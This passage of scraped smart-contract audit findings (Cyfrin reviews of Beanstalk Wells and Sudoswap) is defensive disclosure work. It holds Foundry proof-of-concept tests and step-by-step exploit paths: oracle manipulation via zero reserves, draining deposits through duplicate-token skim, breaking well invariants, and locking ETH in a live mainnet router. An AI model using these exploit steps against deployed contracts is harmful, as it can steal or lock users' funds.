        "function testUpdateCalledWithZero() public {\n    address msgSender = 0x83a740c22a319FBEe5F2FaD0E8Cd0053dC711a1A;\n    changePrank(msgSender);\n    IERC20[] memory mockTokens = well.tokens();\n\n    // add liquidity 1 on each side\n    uint amount = 1;\n    MockToken(address(mockTokens[0])).mint(msgSender, 1);\n    MockToken(address(mockTokens[1])).mint(msgSender, 1);\n    MockToken(address(mockTokens[0])).approve(address(well), amount);\n    MockToken(address(mockTokens[1])).approve(address(well), amount);\n    uint[] memory tokenAmountsIn = new uint[](2);\n    tokenAmountsIn[0] = amount;\n    tokenAmountsIn[1] = amount;\n    uint minLpAmountOut = well.getAddLiquidityOut(tokenAmountsIn);\n    well.addLiquidity(\n        tokenAmountsIn,\n        minLpAmountOut,\n        msgSender,\n        block.timestamp\n    );\n\n    // swaFromFeeOnTransfer from token1 to token0\n    msgSender = 0xfFfFFffFffffFFffFffFFFFFFfFFFfFfFFfFfFfD;\n    changePrank(msgSender);\n    amount = 79_228_162_514_264_337_593_543_950_334;\n    MockToken(address(mockTokens[1])).mint(msgSender, amount);\n    MockToken(address(mockTokens[1])).approve(address(well), amount);\n    uint minAmountOut = well.getSwapOut(\n        mockTokens[1],\n        mockTokens[0],\n        amount\n    );\n\n    well.swapFromFeeOnTransfer(\n        mockTokens[1],\n        mockTokens[0],\n        amount,\n        minAmountOut,\n        msgSender,\n        block.timestamp\n    );\n    increaseTime(120);\n\n    // remove liquidity one token\n    msgSender = address(this);\n    changePrank(msgSender);\n    amount = 999_999_999_999_999_999_999_999_999;\n    uint minTokenAmountOut = well.getRemoveLiquidityOneTokenOut(\n        amount,\n        mockTokens[1]\n    );\n    well.removeLiquidityOneToken(\n        amount,\n        mockTokens[1],\n        minTokenAmountOut,\n        msgSender,\n        block.timestamp\n    );\n\n    msgSender = address(12_345_678);\n    changePrank(msgSender);\n\n    vm.warp(block.timestamp + 1);\n    amount = 1;\n    MockToken(address(mockTokens[0])).mint(msgSender, amount);\n    MockToken(address(mockTokens[0])).approve(address(well), amount);\n    uint amountOut = well.getSwapOut(mockTokens[0], mockTokens[1], amount);\n\n    uint[] memory reserves = well.getReserves();\n    assertEq(reserves[1], 0);\n\n    // we are calling `_update` with reserves of 0, this should fail\n    well.swapFrom(\n        mockTokens[0],\n        mockTokens[1],\n        amount,\n        amountOut,\n        msgSender,\n        block.timestamp\n    );\n}\n"
    ],
    "Description": [
        " The current implementation of GeoEmaAndCumSmaPump assumes each well will call update() with non-zero reserves, as commented at the beginning of the file:",
        "However, there is no actual requirement in Well to enforce pump updates with valid reserve values. Given that GeoEmaAndCumSmaPump restricts values to a minimum of 1 to prevent issues with the geometric mean, that the TWA values are not truly representative of the reserves in the Well, we believe it is worse than reverting in this case, although a ConstantProduct2 Well can have zero reserves for either token via valid transactions."
    ],
    "Impact": [
        " Updating pumps with zero reserve values can lead to the distortion of critical states likely to be utilized for price oracles. Given that the issue is exploitable through valid transactions, we assess the severity as HIGH. It is crucial to note that attackers can exploit this vulnerability to manipulate the price oracle."
    ],
    "Proof of Concept": [
        " The test below shows that it is possible for reserves to be zero through valid transactions and updating pumps do not revert."
    ],
    "Recommended Mitigation": [
        " Revert the pump updates if they are called with zero reserve values."
    ],
    "Beanstalk": [
        " Have decided not to implement the recommended remediation. This is due to several factors. First, there have been two changes made to the pump structure:",
        "Due to 1), if the recommended remediation was implemented, then in the case where a balance of zero was passed in, the Well will continue to function, but the Pump will not be updated. Say a balance in the Well is 1e6, it is then set to 0 for an hour and then set back to 1e6. Because the Pump failed when the Well tried to update the Pump with the zero balance, it was not updated at all. Thus, the Pump will assume that the balance was 1e6 the whole time and not set to zero, which implies that the Pump is not an accurate measure of historical balances and could be manipulated (assuming the Well Function could use a balance of 0).",
        "In addition, the difference between a balance of 1 and 0 is quite small. First, in neither case is the Well acting as a reliable source of price discovery. If there is only 1 micro-unit of an ERC-20 token in a Well, then there is essentially no bid to sell any more of that asset given the value of 1 micro-unit of an ERC-20 token is infinitesimal. For this reason, any protocol using the Pump should ensure that there is a sufficient balance of both ERC-20 tokens in the Well to ensure that it is an accurate source of price discovery. Therefore, the consequence of using a balance of 1 when the Pump intakes a balance of 0 should be minimal."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/removeliquidity-logic-is-not-correct-for-generalized-well-functions-other-than-constantproduct-cyfrin-beanstalk-wells-markdown_
--------------------------------------------------
----Start JSON----
{
    "code": [
        "// QuadraticWell.sol\n\n/**\n * SPDX-License-Identifier: MIT\n **/\n\npragma solidity ^0.8.17;\n\nimport \"src/interfaces/IWellFunction.sol\";\nimport \"src/libraries/LibMath.sol\";\n\ncontract QuadraticWell is IWellFunction {\n    using LibMath for uint;\n\n    uint constant PRECISION = 1e18; //@audit-info assume 1:1 upperbound for this well\n    uint constant PRICE_BOUND = 1e18;\n\n    /// @dev s = b_0 - (p_1^2 - b_1/2)^2\n    function calcLpTokenSupply(\n        uint[] calldata reserves,\n        bytes calldata\n    ) external override pure returns (uint lpTokenSupply) {\n        uint delta = PRICE_BOUND - reserves[1] / 2;\n        lpTokenSupply = reserves[0] - delta*delta/PRECISION ;\n    }\n\n    /// @dev b_0 = s + (p_1^2 - b_1/2)^2\n    /// @dev b_1 = (p_1^2 - (b_0 - s)^(1/2))*2\n    function calcReserve(\n        uint[] calldata reserves,\n        uint j,\n        uint lpTokenSupply,\n        bytes calldata\n    ) external override pure returns (uint reserve) {\n\n        if(j == 0)\n        {\n            uint delta = PRICE_BOUND*PRICE_BOUND - PRECISION*reserves[1]/2;\n            return lpTokenSupply + delta*delta /PRECISION/PRECISION/PRECISION;\n        }\n        else {\n            uint delta = (reserves[0] - lpTokenSupply)*PRECISION;\n            return (PRICE_BOUND*PRICE_BOUND - delta.sqrt()*PRECISION)*2/PRECISION;\n        }\n    }\n\n    function name() external override pure returns (string memory) {\n        return \"QuadraticWell\";\n    }\n\n    function symbol() external override pure returns (string memory) {\n        return \"QW\";\n    }\n}\n\n// NOTE: Put in Exploit.t.sol\nfunction test_exploitQuadraticWellAddRemoveLiquidity() public {\n    MockQuadraticWell quadraticWell = new MockQuadraticWell();\n    Call memory _wellFunction = Call(address(quadraticWell), \"\");\n    Well well2 = Well(auger.bore(\"Well2\", \"WELL2\", tokens, _wellFunction, pumps));\n\n    approveMaxTokens(user, address(well2));\n    uint[] memory amounts = new uint[](tokens.length);\n    changePrank(user);\n\n    // initial status 1:1\n    amounts[0] = 1e18;\n    amounts[1] = 1e18;\n    well2.addLiquidity(amounts, 0, user); // state: [1 ether, 1 ether, 0.75 ether]\n\n    Balances memory userBalances1 = getBalances(user, well2);\n    uint[] memory userBalances = new uint[](3);\n    userBalances[0] = userBalances1.tokens[0];\n    userBalances[1] = userBalances1.tokens[1];\n    userBalances[2] = userBalances1.lp;\n    Balances memory wellBalances1 = getBalances(address(well2), well2);\n    uint[] memory wellBalances = new uint[](3);\n    wellBalances[0] = wellBalances1.tokens[0];\n    wellBalances[1] = wellBalances1.tokens[1];\n    wellBalances[2] = wellBalances1.lpSupply;\n    amounts[0] = wellBalances[0];\n    amounts[1] = wellBalances[1];\n\n    emit log_named_array(\"userBalances1\", userBalances);\n    emit log_named_array(\"wellBalances1\", wellBalances);\n    emit log_named_int(\"invariant\", quadraticWell.wellInvariant(wellBalances[2], amounts));\n\n    // addLiquidity\n    amounts[0] = 2e18;\n    amounts[1] = 1e18;\n    well2.addLiquidity(amounts, 0, user); // state: [3 ether, 2 ether, 3 ether]\n\n    Balances memory userBalances2 = getBalances(user, well2);\n    userBalances[0] = userBalances2.tokens[0];\n    userBalances[1] = userBalances2.tokens[1];\n    userBalances[2] = userBalances2.lp;\n    Balances memory wellBalances2 = getBalances(address(well2), well2);\n    wellBalances[0] = wellBalances2.tokens[0];\n    wellBalances[1] = wellBalances2.tokens[1];\n    wellBalances[2] = wellBalances2.lpSupply;\n    amounts[0] = wellBalances[0];\n    amounts[1] = wellBalances[1];\n\n    emit log_named_array(\"userBalances2\", userBalances);\n    emit log_named_array(\"wellBalances2\", wellBalances);\n    emit log_named_int(\"invariant\", quadraticWell.wellInvariant(wellBalances[2], amounts));\n\n    // removeLiquidity\n    amounts[0] = 0;\n    amounts[1] = 0;\n    well2.removeLiquidity(userBalances[2], amounts, user);\n\n    Balances memory userBalances3 = getBalances(user, well2);\n    userBalances[0] = userBalances3.tokens[0];\n    userBalances[1] = userBalances3.tokens[1];\n    userBalances[2] = userBalances3.lp;\n    Balances memory wellBalances3 = getBalances(address(well2), well2);\n    wellBalances[0] = wellBalances3.tokens[0];\n    wellBalances[1] = wellBalances3.tokens[1];\n    wellBalances[2] = wellBalances3.lpSupply;\n    amounts[0] = wellBalances[0];\n    amounts[1] = wellBalances[1];\n\n    emit log_named_array(\"userBalances3\", userBalances);\n    emit log_named_array(\"wellBalances3\", wellBalances);\n    emit log_named_int(\"invariant\", quadraticWell.wellInvariant(wellBalances[2], amounts)); // @audit-info well's invariant is broken via normal removeLiquidity\n}\n",
        "forge test -vv --match-test test_exploitQuadraticWellAddRemoveLiquidity\n\n[PASS] test_exploitQuadraticWellAddRemoveLiquidity() (gas: 4462244)\nLogs:\n  userBalances1: [999000000000000000000, 999000000000000000000, 750000000000000000]\n  wellBalances1: [1000000000000000000, 1000000000000000000, 750000000000000000]\n  invariant: 0\n  userBalances2: [997000000000000000000, 998000000000000000000, 3000000000000000000]\n  wellBalances2: [3000000000000000000, 2000000000000000000, 3000000000000000000]\n  invariant: 0\n  userBalances3: [1000000000000000000000, 1000000000000000000000, 0]\n  wellBalances3: [0, 0, 0]\n  invariant: 1000000000000000000\n\nTest result: ok. 1 passed; 0 failed; finished in 5.14ms\n"
    ],
    "Description": [
        " The protocol intends to provide a generalized framework for constant-function AMM liquidity pools where various Well functions can be used. Currently, only the constant-product type Well function is defined, but we understand that more general Well functions are intended to be supported.",
        "The current implementation of Well::removeLiquidity and Well::getRemoveLiquidityOut assumes linearity while getting the output token amount from the LP token amount to withdraw. This holds well for the constant product type, as seen below. If we denote the total supply of LP tokens as $L$, the reserve values for the two tokens as $x, y$, and the invariant is $L^2=4xy$ for ConstantProduct2.\nWhen removing liquidity of amount $l$, the output amounts are calculated as $\\Delta x=\\frac{l}{L}x, \\Delta y=\\frac{l}{L}y$. It is straightforward to verify that the invariant still holds after withdrawal, i.e., $(L-l)^2=(x-\\Delta x)(y-\\Delta y)$.",
        "But in general, this kind of linearity is not guaranteed to hold.",
        "Recently, non-linear (quadratic) function AMMs have been introduced by some new protocols (see Numoen). If we use this kind of Well function, the current calculation of tokenAmountsOut will break the Well's invariant.",
        "For your information, the Numoen protocol checks the protocol's invariant (the constant function itself) after every transaction."
    ],
    "Impact": [
        " The current Well::removeLiquidity logic assumes a specific condition on the Well function (linearity in some sense). This limits the generalization of the protocol as opposed to its original purpose. Given that this will lead to loss of funds for the liquidity providers for general Well functions, we evaluate the severity to HIGH."
    ],
    "Proof of Concept": [
        " We wrote a test case with the quadratic Well function used by Numoen.",
        "The output is shown below. We calculated the invariant of the Well after transactions, and while it is supposed to stay at zero, it is broken after removing liquidity. Note that the invariant stayed zero on adding liquidity because the protocol explicitly calculates the resulting liquidity token supply using the Well function. However, the output amounts are calculated in a fixed manner when removing liquidity without using the Well function, which breaks the invariant."
    ],
    "Recommended Mitigation": [
        " We believe it is impossible to cover all kinds of Well functions without adding some additional functions in the interface IWellFunction. We recommend adding a new function in the IWellFunction interface, possibly in the form of function calcWithdrawFromLp(uint lpTokenToBurn) returns (uint reserve). The output token amount can be calculated using the newly added function."
    ],
    "Beanstalk": [
        " Added a calcLPTokenUnderlying function to IWellFunction. It returns the amount of each reserve token underlying a given amount of LP tokens. It is used to determine how many underlying tokens to send to a user when they remove liquidity using the removeLiquidity function. Fixed in commit 5271e9a."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/should-ensure-uniqueness-of-the-tokens-of-wells-cyfrin-beanstalk-wells-markdown_
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function skim(address recipient) external nonReentrant returns (uint[] memory skimAmounts) {\n    IERC20[] memory _tokens = tokens();\n    uint[] memory reserves = _getReserves(_tokens.length);\n    skimAmounts = new uint[](_tokens.length);\n    for (uint i; i < _tokens.length; ++i) {\n        skimAmounts[i] = _tokens[i].balanceOf(address(this)) - reserves[i];\n        if (skimAmounts[i] > 0) {\n            _tokens[i].safeTransfer(recipient, skimAmounts[i]);\n        }\n    }\n}\n"
    ],
    "Description": [
        " The current implementation does not enforce uniqueness in the tokens of Wells.\nAnyone can call Aquifer::boreWell() with malicious Well implementation to set up a trap for victims.\nThrough communication with the protocol team, it is understood that all Wells are considered guilty until proven innocent.\nBut it is still desirable to verify the Well on Aquifier::boreWell and prevent deployments of malicious Wells.\nIt is also strongly recommended to prohibit changing tokens() after the deployment.",
        "If a Well has duplicate tokens, an attack path shown below exists, and there can be more."
    ],
    "Impact": [
        " While we assume users will be warned explicitly about malicious Wells and not likely to interact with invalid Wells, we evaluate the severity to MEDIUM."
    ],
    "Proof of Concept": [
        " Let us say tokens[0]=tokens[1].\nAn honest LP calls addLiquidity([1 ether,1 ether], 200 ether, address), and the reserves will be (1 ether, 1 ether). But anyone can call skim() and take 1 ether out. This is because skimAmounts relies on the balanceOf(), which will return 2 ether for the first loop."
    ],
    "Recommended Mitigation": [
        ""
    ],
    "Beanstalk": [
        " Fixed in commit f10e05a."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/liblastreservebytesstorelastreserves-has-no-check-for-reserves-being-too-large-cyfrin-beanstalk-wells-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "src\\libraries\\LibLastReserveBytes.sol\n21:    uint8 n = uint8(reserves.length);\n22:    if (n == 1) {\n23:        assembly {\n24:            sstore(slot, or(or(shl(208, lastTimestamp), shl(248, n)), shl(104, shr(152, mload(add(reserves, 32))))))\n25:        }\n26:        return;\n27:    }\n28:    assembly {\n29:        sstore(\n30:            slot,\n31:            or(\n32:                or(shl(208, lastTimestamp), shl(248, n)),\n33:                or(shl(104, shr(152, mload(add(reserves, 32)))), shr(152, mload(add(reserves, 64))))\n34:            )\n35:        )\n36:        // slot := add(slot, 32)\n37:    }\n",
        "require(reserves[0] <= type(uint128).max, \"ByteStorage: too large\");\n",
        "function testStoreAndReadTwo() public {\n    uint40 lastTimeStamp = 12345363;\n    bytes16[] memory reserves = new bytes16[](2);\n    reserves[0] = 0xffffffffffffffffffffffffffffffff; // This is too big!\n    reserves[1] = 0x11111111111111111111111100000000;\n    RESERVES_STORAGE_SLOT.storeLastReserves(lastTimeStamp, reserves);\n    (\n        uint8 n,\n        uint40 _lastTimeStamp,\n        bytes16[] memory _reserves\n    ) = RESERVES_STORAGE_SLOT.readLastReserves();\n    assertEq(2, n);\n    assertEq(lastTimeStamp, _lastTimeStamp);\n    assertEq(reserves[0], _reserves[0]); // This will fail\n    assertEq(reserves[1], _reserves[1]);\n    assertEq(reserves.length, _reserves.length);\n}\n"
    ],
    "Description": [
        " After every liquidity event & swap, the IPump::update()is called. To update the pump, theLibLastReserveBytes::storeLastReservesfunction is used. This packs the reserve data intobytes32` slots in storage.\nA slot is then broken down into the following components:",
        "This adds to 22 bytes total, but the function also attempts to pack the second reserve balance in the bytes32 object.\nThis would mean the bytes32 would need 38 bytes total:",
        "1(length) + 5(timestamp) + 16(reserve balance 1) + 16(reserve balance 2) = 38 bytes",
        "To fit all this data into the bytes32, the function cuts off the last few bytes of the reserve balances using shift, as shown below.",
        "So if the amount being stored is too large, the actual stored value will be different than what was expected to be stored.",
        "On the other hand, the LibBytes.sol does seem to have a check:",
        "The _setReserves function calls this library after every reserve update in the well.\nSo in practice, with the currently implemented wells & pumps, this check would cause a revert.",
        "However, a well that is implemented without this check could additionally trigger the pumps to cut off reserve data, meaning prices would be incorrect."
    ],
    "Impact": [
        " While we assume users will be explicitly warned about malicious Wells and are unlikely to interact with invalid Wells, we assess the severity to be MEDIUM."
    ],
    "Proof of Concept": [
        ""
    ],
    "Recommended Mitigation": [
        " We recommend adding a check on the size of reserves in LibLastReseveBytes.",
        "Additionally, it is recommended to add comments to LibLastReseveBytes to inform users about the invariants of the system and how the max size of reserves should be equal to the max size of a bytes16 and not a uint256."
    ],
    "Beanstalk": [
        " Because the Pump packs 2 last reserve values in the form of bytes16 quadruple precision floating point values and a uint40 timestamp into the same slot, there is a loss of precision on last reserve values. Each last reserve value only has precision of ~27 decimals instead of the expected ~34 decimals.",
        "Given that the last reserves are only used to determine the cap on reserve updates and that the 27 decimals that are preserved are the most significant decimals, the impact due to this is minimal. The cap is only used to prevent the effect of manipulation, and is arbitrarily set. It is also never evaluated by external protocols. Finally, 27 decimal precision is still quite significant \u2192 If would need to be about 1,000,000,000,000,000,000,000,000,000 tokens in the pool for there to be an error of 1."
    ],
    "Cyfrin": [
        " Acknowledged.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/specified-minoutput-will-remain-locked-in-lssvmrouterswapnftsforspecificnftsthrougheth-cyfrin-sudoswap-markdown_
--------------------------------------------------
----Start JSON----
{
    "code": [
        "diff --git a/src/test/interfaces/ILSSVMPairFactoryMainnet.sol b/src/test/interfaces/ILSSVMPairFactoryMainnet.sol\nnew file mode 100644\nindex 0000000..3cdea5b\n--- /dev/null\n+++ b/src/test/interfaces/ILSSVMPairFactoryMainnet.sol\n@@ -0,0 +1,20 @@\n+// SPDX-License-Identifier: MIT\n+pragma solidity ^0.8.0;\n+\n+import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n+import {ICurve} from \"../../bonding-curves/ICurve.sol\";\n+import {LSSVMPair} from \"../../LSSVMPair.sol\";\n+import {LSSVMPairETH} from \"../../LSSVMPairETH.sol\";\n+\n+interface ILSSVMPairFactoryMainnet {\n+    function createPairETH(\n+        IERC721 _nft,\n+        ICurve _bondingCurve,\n+        address payable _assetRecipient,\n+        LSSVMPair.PoolType _poolType,\n+        uint128 _delta,\n+        uint96 _fee,\n+        uint128 _spotPrice,\n+        uint256[] calldata _initialNFTIDs\n+    ) external payable returns (LSSVMPairETH pair);\n+}\ndiff --git a/src/test/mixins/UsingETH.sol b/src/test/mixins/UsingETH.sol\nindex 0e5cb40..8fecb1e 100644\n--- a/src/test/mixins/UsingETH.sol\n+++ b/src/test/mixins/UsingETH.sol\n@@ -14,6 +14,8 @@ import {LSSVMPairFactory} from \"../../LSSVMPairFactory.sol\";\n import {LSSVMPairERC721} from \"../../erc721/LSSVMPairERC721.sol\";\n import {LSSVMPairERC1155} from \"../../erc1155/LSSVMPairERC1155.sol\";\n\n+import {ILSSVMPairFactoryMainnet} from \"../interfaces/ILSSVMPairFactoryMainnet.sol\";\n+\n abstract contract UsingETH is Configurable, RouterCaller {\n     function modifyInputAmount(uint256 inputAmount) public pure override returns (uint256) {\n         return inputAmount;\n@@ -46,6 +48,25 @@ abstract contract UsingETH is Configurable, RouterCaller {\n         return pair;\n     }\n\n+    function setupPairERC721Mainnet(\n+        ILSSVMPairFactoryMainnet factory,\n+        IERC721 nft,\n+        ICurve bondingCurve,\n+        address payable assetRecipient,\n+        LSSVMPair.PoolType poolType,\n+        uint128 delta,\n+        uint96 fee,\n+        uint128 spotPrice,\n+        uint256[] memory _idList,\n+        uint256,\n+        address\n+    ) public payable returns (LSSVMPair) {\n+        LSSVMPairETH pair = factory.createPairETH{value: msg.value}(\n+            nft, bondingCurve, assetRecipient, poolType, delta, fee, spotPrice, _idList\n+        );\n+        return pair;\n+    }\n+\n     function setupPairERC1155(CreateERC1155PairParams memory params) public payable override returns (LSSVMPair) {\n         LSSVMPairETH pair = params.factory.createPairERC1155ETH{value: msg.value}(\n             params.nft,\ndiff --git a/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol b/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol\nnew file mode 100644\nindex 0000000..596da45\n--- /dev/null\n+++ b/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol\n@@ -0,0 +1,114 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import \"forge-std/Test.sol\";\n+\n+import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n+import {Test721} from \"../../mocks/Test721.sol\";\n+\n+import {ICurve} from \"../../bonding-curves/ICurve.sol\";\n+import {ILSSVMPairFactoryMainnet} from \"../interfaces/ILSSVMPairFactoryMainnet.sol\";\n+\n+import {UsingETH} from \"../mixins/UsingETH.sol\";\n+import {ConfigurableWithRoyalties} from \"../mixins/ConfigurableWithRoyalties.sol\";\n+import {LinearCurve, UsingLinearCurve} from \"../../test/mixins/UsingLinearCurve.sol\";\n+\n+import {LSSVMPair} from \"../../LSSVMPair.sol\";\n+import {LSSVMPairETH} from \"../../LSSVMPairETH.sol\";\n+import {LSSVMRouter} from \"../../LSSVMRouter.sol\";\n+import {RoyaltyEngine} from \"../../RoyaltyEngine.sol\";\n+import {LSSVMPairFactory} from \"../../LSSVMPairFactory.sol\";\n+\n+\n+contract CyfrinLSSVMRouterPoC is Test, ConfigurableWithRoyalties, UsingLinearCurve, UsingETH {\n+    IERC721 test721;\n+    address payable alice;\n+\n+    LSSVMRouter constant LSSVM_ROUTER = LSSVMRouter(payable(address(0x2B2e8cDA09bBA9660dCA5cB6233787738Ad68329)));\n+    LSSVMPairFactory constant LSSVM_PAIR_FACTORY = LSSVMPairFactory(payable(address(0xb16c1342E617A5B6E4b631EB114483FDB289c0A4)));\n+    LinearCurve constant LINEAR_CURVE = LinearCurve(payable(address(0x5B6aC51d9B1CeDE0068a1B26533CAce807f883Ee)));\n+\n+    function setUp() public {\n+        vm.createSelectFork(vm.envOr(\"MAINNET_RPC_URL\", string.concat(\"https://rpc.ankr.com/eth\")));\n+\n+        test721 = setup721();\n+        alice = payable(makeAddr(\"alice\"));\n+        deal(alice, 1 ether);\n+    }\n+\n+    function test_minOutputIsLockedInRouterWhenCallingswapNFTsForSpecificNFTsThroughETH() public {\n+        Test721(address(test721)).mint(alice, 1);\n+        uint256[] memory nftToTokenTradesIds = new uint256[](1);\n+        nftToTokenTradesIds[0] = 1;\n+        Test721(address(test721)).mint(address(this), 2);\n+        Test721(address(test721)).mint(address(this), 3);\n+        Test721(address(test721)).mint(address(this), 4);\n+        uint256[] memory ids = new uint256[](3);\n+        ids[0] = 2;\n+        ids[1] = 3;\n+        ids[2] = 4;\n+        uint256[] memory tokenToNFTTradesIds = new uint256[](1);\n+        tokenToNFTTradesIds[0] = ids[ids.length - 1];\n+\n+        test721.setApprovalForAll(address(LSSVM_PAIR_FACTORY), true);\n+        LSSVMPair pair721 = this.setupPairERC721Mainnet{value: 10 ether}(\n+            ILSSVMPairFactoryMainnet(address(LSSVM_PAIR_FACTORY)),\n+            test721,\n+            LINEAR_CURVE,\n+            payable(address(0)),\n+            LSSVMPair.PoolType.TRADE,\n+            0.1 ether, // delta\n+            0.1 ether, // 10% for trade fee\n+            1 ether, // spot price\n+            ids,\n+            10 ether,\n+            address(0)\n+        );\n+\n+        uint256 pairETHBalanceBefore = address(pair721).balance;\n+        uint256 aliceETHBalanceBefore = address(alice).balance;\n+        uint256 routerETHBalanceBefore = address(LSSVM_ROUTER).balance;\n+\n+        emit log_named_uint(\"pairETHBalanceBefore\", pairETHBalanceBefore);\n+        emit log_named_uint(\"aliceETHBalanceBefore\", aliceETHBalanceBefore);\n+        emit log_named_uint(\"routerETHBalanceBefore\", routerETHBalanceBefore);\n+\n+        uint256 minOutput;\n+        {\n+            LSSVMRouter.PairSwapSpecific[] memory nftToTokenTrades = new LSSVMRouter.PairSwapSpecific[](1);\n+            nftToTokenTrades[0] = LSSVMRouter.PairSwapSpecific({\n+                pair: pair721,\n+                nftIds: nftToTokenTradesIds\n+            });\n+\n+            LSSVMRouter.PairSwapSpecific[] memory tokenToNFTTrades = new LSSVMRouter.PairSwapSpecific[](1);\n+            tokenToNFTTrades[0] = LSSVMRouter.PairSwapSpecific({\n+                pair: pair721,\n+                nftIds: tokenToNFTTradesIds\n+            });\n+\n+            LSSVMRouter.NFTsForSpecificNFTsTrade memory trade = LSSVMRouter.NFTsForSpecificNFTsTrade({\n+                nftToTokenTrades: nftToTokenTrades,\n+                tokenToNFTTrades: tokenToNFTTrades\n+            });\n+\n+\n+            vm.startPrank(alice);\n+            test721.setApprovalForAll(address(LSSVM_ROUTER), true);\n+            minOutput = 0.79 ether;\n+            LSSVM_ROUTER.swapNFTsForSpecificNFTsThroughETH{value: 1 ether}(trade, minOutput, alice, alice, block.timestamp + 10);\n+        }\n+\n+        uint256 pairETHBalanceAfter = address(pair721).balance;\n+        uint256 aliceETHBalanceAfter = address(alice).balance;\n+        uint256 routerETHBalanceAfter = address(LSSVM_ROUTER).balance;\n+\n+        assertTrue(test721.ownerOf(tokenToNFTTradesIds[0]) == alice);\n+        assertGt(pairETHBalanceAfter, pairETHBalanceBefore);\n+        assertEq(routerETHBalanceAfter, minOutput);\n+\n+        emit log_named_uint(\"pairETHBalanceAfter\", pairETHBalanceAfter);\n+        emit log_named_uint(\"aliceETHBalanceAfter\", aliceETHBalanceAfter);\n+        emit log_named_uint(\"routerETHBalanceAfter\", routerETHBalanceAfter);\n+    }\n+}\n"
    ],
    "Description": [
        "\nThe Cyfrin team understands that LSSVMRouter is slightly out of scope for this audit, given that it is intended to be deprecated and replaced by VeryFastRouter; however, a slightly modified version of this contract is currently deployed and live on mainnet. We have found a bug in LSSVMRouter::swapNFTsForSpecificNFTsThroughETH and LSSVMRouter::swapNFTsForAnyNFTsThroughETH which has been validated against a mainnet fork to lock user funds sent with the function call as specified by the minOutput parameter. In other words, users attempting to protect themselves from slippage will find that this causes their funds to become locked - the higher the minimum expected output specified, the higher value of funds locked.",
        "Users specifying a non-zero minOutput value will have this amount deducted from the inputAmount sent on the second half of the swap, from ETH to NFTs, handled by the internal functions LSSVMRouter::_swapETHForSpecificNFTs and LSSVMRouter::_swapETHForAnyNFTs. Given that it is the responsibility of these internal functions to issue a refund of any unspent ETH based on this inputAmount parameter, the excess value represented by minOutput is not included in the remainingValue calculation and so will not be included in the subsequent ETH transfer. If there are no intermediate underflows (due to a sufficiently large value of minOutput) then any excess ETH as specified by minOutput will therefore remain locked in the router forever.",
        "Fortunately, it appears these functions have never actually been called on the mainnet deployment as they have not been connected to the Sudoswap front end. While Sudoswap doesn't use these functions on the client, contract-level integrators may find themselves with potentially lost funds, so the Sudorandom Labs team has attempted to reach out to those potentially affected."
    ],
    "Proof of Concept": [
        "\nApply the following git diff:"
    ],
    "Impact": [
        "\nThis vulnerability results in the locking of user funds with high impact and likelihood. If the problematic functions were integrated into a UI, then this would be evaluated as CRITICAL, but given that the current integrations significantly reduce the likelihood, we evaluate the severity as HIGH."
    ],
    "Recommended Mitigation": [
        "\nPass minOutput through to the internal functions to be used in refund calculations and correctly reflect the true contract balance, validating that this amount is not exceeded. This way, the outputAmount return value will correctly reflect the excess ETH transferred to the caller."
    ],
    "Sudoswap": [
        "\nAcknowledged. This issue is present in current implementation of the Router, but no UIs are currently integrated to interact with this specific function. The contract is expected to be deprecated soon in favour of the VeryFastRouter."
    ],
    "Cyfrin": [
        "\nAcknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/malicious-pair-can-re-enter-veryfastrouter-to-drain-original-callers-funds-cyfrin-sudoswap-markdown_
--------------------------------------------------
----Start JSON----
{
    "code": [
        "diff --git a/src/VeryFastRouter.sol b/src/VeryFastRouter.sol\nindex 16047b9..2bd3797 100644\n--- a/src/VeryFastRouter.sol\n+++ b/src/VeryFastRouter.sol\n@@ -85,6 +85,7 @@ contract VeryFastRouter {\n     error VeryFastRouter__InvalidPair();\n     error VeryFastRouter__BondingCurveQuoteError();\n\n+   event vfr_log_named_uint         (string key, uint val);\n     constructor(ILSSVMPairFactoryLike _factory) {\n         factory = _factory;\n     }\n@@ -403,12 +404,12 @@ contract VeryFastRouter {\n\n                 // Deduct ETH amount if it's an ETH swap\n                 if (order.ethAmount != 0) {\n-                    console.log(\"deducting eth amount\");\n-                    console.log(\"before: %s\", ethAmount);\n+                    // console.log(\"deducting eth amount\");\n+                    // console.log(\"before: %s\", ethAmount);\n                     ethAmount -= inputAmount;\n-                    console.log(\"after: %s\", ethAmount);\n-                    console.log(\"router balance: %s\", address(this).balance);\n-                    console.log(\"sender balance: %s\", msg.sender.balance);\n+                    // console.log(\"after: %s\", ethAmount);\n+                    // console.log(\"router balance: %s\", address(this).balance);\n+                    // console.log(\"sender balance: %s\", msg.sender.balance);\n                 }\n             }\n             // Otherwise, we need to do some partial fill calculations first\n@@ -488,10 +489,15 @@ contract VeryFastRouter {\n         }\n\n         // Send excess ETH back to token recipient\n-        console.log(\"ethAmount: %s\", ethAmount);\n+        emit vfr_log_named_uint(\"eth Amount\", ethAmount);\n+        emit vfr_log_named_uint(\"pair balance before\", address(this).balance);\n+        if(address(this).balance > ethAmount){\n+            emit vfr_log_named_uint(\"pair balance after\", address(this).balance - ethAmount);\n+        }\n+        else{\n+            emit vfr_log_named_uint(\"pair balance after\", 0);\n+        }\n         if (ethAmount != 0) {\n-            console.log(\"balance: %s\", address(this).balance);\n-            console.log(\"transfering %s ETH to: %s\", ethAmount, swapOrder.tokenRecipient);\n             payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount); // @audit-ok - doesn't seem to be a case when this is less than the actual amount to refund\n         }\n     }\ndiff --git a/src/test/base/VeryFastRouterAllSwapTypes.sol b/src/test/base/VeryFastRouterAllSwapTypes.sol\nindex 9909271..6294bd2 100644\n--- a/src/test/base/VeryFastRouterAllSwapTypes.sol\n+++ 